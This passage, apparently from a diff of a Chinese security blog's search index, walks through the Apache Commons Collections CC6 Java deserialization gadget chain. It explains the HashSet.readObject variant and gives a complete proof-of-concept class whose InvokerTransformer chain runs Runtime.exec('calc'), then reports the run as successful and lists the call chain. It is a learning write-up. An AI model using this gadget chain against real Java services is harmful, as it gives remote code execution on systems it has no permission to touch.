factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行看一下结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726162609492.png"
+                      alt="image-20230726162609492"
+                ></p>
+<p>触发成功。</p>
+<h3 id="hashSet（方法二）"><a href="#hashSet（方法二）" class="headerlink" title="hashSet（方法二）"></a>hashSet（方法二）</h3><p>在上面我们我们分析了，hashmap的put方法在调用时也会调用hashcode方法进而调用后续执行链，我们在前面是通过修改传入的chainTransform对象，使执行链断开，使在调用put方法时无法执行后续执行链。</p>
+<p>那我们是否可以利用这个put方法，将其纳入到利用链里面。</p>
+<p>我们这里可以找一下put方法的调用：</p>
+<p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">////*/**********中间代码省略</span><br><span class="line"></span><br><span class="line">        // Read in all elements in the proper order.</span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们只需要让或者map的值是我们的hashmap对象就行了，我们就可以通过这个hashSet调用后续执行链。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165235137.png"
+                      alt="image-20230726165235137"
+                ></p>
+<p>可以看到这个readObject中会自动创建一个map，然后这里会判断始HashSet对象是不是LinkedHashSet的实例，是的话会创建一个一个新的<code>LinkedHashMap</code>对象，不是的话就会创造一个hashmap对象。</p>
+<p>那我们只用改变生成的hashmap对象的key值为我们要传入的TiedMapEntry对象，后面再调用map.put的时候就可以触发后续执行链。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(e, PRESENT);</span><br></pre></td></tr></table></figure></div>
+
+<p>所以我们就是要让这里的e变成我们创建的TiedMapEntry对象。</p>
+<p>那我们这里可以看一下<code>HashSet.writeObject</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165940060.png"
+                      alt="image-20230726165940060"
+                ></p>
+<p>这里的e就是map中的key值，复制给e然后进行序列化，那么也就是说如果我们变量map中存在值，这里就会将其序列化，那么我们只要将我们构造的TiedMapEntry对象传入到这个map中，再反序列化调用put时就可以触发后续利用链。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726170902125.png"
+                      alt="image-20230726170902125"
+                ></p>
+<p>再hashSet方法中会向map中添加一个key</p>
+<p>那我们这里直接通过add方法将我们的TiedMapEntry对象传入进去，进而触发后续利用链。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet hashSet=new HashSet();</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="最终POC："><a href="#最终POC：" class="headerlink" title="最终POC："></a>最终POC：</h3><p>那么根据上面的分析我们的poc就可以修改为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        HashSet hashSet=new HashSet();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(&quot;test1&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行测试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726171407225.png"
+                      alt="image-20230726171407225"
+                ></p>
+<p>触发成功。</p>
+<p>利用链：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.hash</span><br><span class="line">TiedMapEntry.hashCode</span><br><span class="line">TiedMapEntry.getValue</span><br><span class="line">LazyMap.get</span><br><span class="line">ChainedTransformer.transform</span><br><span class="line">InvokerTransformer.transform</span><br><span class="line">Runtime.exec</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>cc6利用链流程图</p>
+<p><strong><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726172720852.png"
+                      alt="image-20230726172720852"
+                ></strong></p>
+<p>结合urldns和cc1的一个整体流程图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726173711097.png"
+                      alt="image-20230726173711097"
+                ></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
 </search>
